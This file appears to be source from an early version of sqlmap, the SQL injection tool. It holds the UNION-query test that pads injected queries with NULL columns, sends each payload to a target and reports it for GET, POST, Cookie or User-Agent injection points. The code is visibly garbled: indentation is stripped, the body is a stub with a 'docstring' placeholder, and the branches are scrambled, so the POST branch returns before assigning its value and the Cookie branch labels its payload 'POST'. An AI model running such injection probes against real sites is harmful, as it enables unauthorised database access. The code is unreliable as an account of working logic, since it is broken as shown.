"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request
def __effectiveUnionTest(query, comment):...
"""docstring"""
resultDict = {}
for count in range(0, 50):
if kb.dbms == 'Oracle' and query.endswith(' FROM DUAL'):
return None
query = query[:-len(' FROM DUAL')]
if count:
query += ', NULL'
if kb.dbms == 'Oracle':
query += ' FROM DUAL'
commentedQuery = agent.postfixQuery(query, comment)
payload = agent.payload(newValue=commentedQuery)
newResult = Request.queryPage(payload)
if not newResult in resultDict.keys():
resultDict[newResult] = 1, commentedQuery
resultDict[newResult] = resultDict[newResult][0] + 1, commentedQuery
if count:
for element in resultDict.values():
if element[0] == 1:
if kb.injPlace == 'GET':
value = '%s?%s' % (conf.url, payload)
if kb.injPlace == 'POST':
return value
value = "URL:\t'%s'" % conf.url
if kb.injPlace == 'Cookie':
value += "\nPOST:\t'%s'\n" % payload
value = "URL:\t'%s'" % conf.url
if kb.injPlace == 'User-Agent':
value += "\nCookie:\t'%s'\n" % payload
value = "URL:\t\t'%s'" % conf.url
value += """
User-Agent:	'%s'
""" % payload
